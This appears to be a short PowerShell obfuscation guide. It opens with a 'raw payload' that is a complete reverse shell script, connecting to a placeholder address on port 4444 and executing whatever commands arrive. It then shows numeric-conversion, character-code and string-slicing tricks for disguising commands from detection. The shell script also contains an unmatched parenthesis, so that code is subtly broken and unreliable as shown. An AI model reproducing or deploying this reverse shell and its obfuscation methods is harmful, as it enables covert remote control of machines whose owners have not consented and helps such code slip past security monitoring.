# Theory
> Obfuscation is the deliberate addition of ambiguous, confusing,
> or misleading information to interfere with surveillance and data collection

### Raw Payload
```powershell
$ReverseShellConnection = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 4444)
$NetworkStream = $ReverseShellConnection.GetStream()
$ReadBuffer = New-Object Byte[] 65536

while (($BytesRead = $NetworkStream.Read($ReadBuffer, 0, $ReadBuffer.Length)) -ne 0) {
    $CommandOutput = [System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead)
    $ExecutedOutput = Invoke-Expression $CommandOutput 2>&1) | Out-String
    $PromptWithOutput = $ExecutedOutput + [Environment]::UserName + '@' + [System.Net.Dns]::GetHostName() + ' [' + $(Get-Location) + ']~$ '
    $OutputBytes = [text.encoding]::ASCII.GetBytes($PromptWithOutput)
    $NetworkStream.Write($OutputBytes, 0, $OutputBytes.Length)
    $NetworkStream.Flush()
}

$ReverseShellConnection.Close()
```

### Powershell Obfuscation Methods
<p>Numeric to string conversion obfuscation</p>
<p>Character code obfuscation</p>
<p>String slicing and indexing obfuscation</p>

```powershell
# NUMERIC CONVERSION -> Write-Host 420
[string]::join('',((87,114,105,116,101,45,72,111,115,116,32,52,50,48)|%{[char]$_}))

# CHARACTER CODE -> Write-Host 420
[char](87)+[char](114)+[char](105)+[char](116)+[char](101)+[char](45)+[char](72)+[char](111)+[char](115)+[char](116)+[char](32)+[char](52)+[char](50)+[char](48)

# STRING SLICING -> Write-Host 420
"zttxirGVRskXrsEFIcH0X2cPLmO WnoruBWUks-f2neGJNIo46"[34,12,4,2,42,38,18,30,13,1,27,48,40,19] -join ""
```
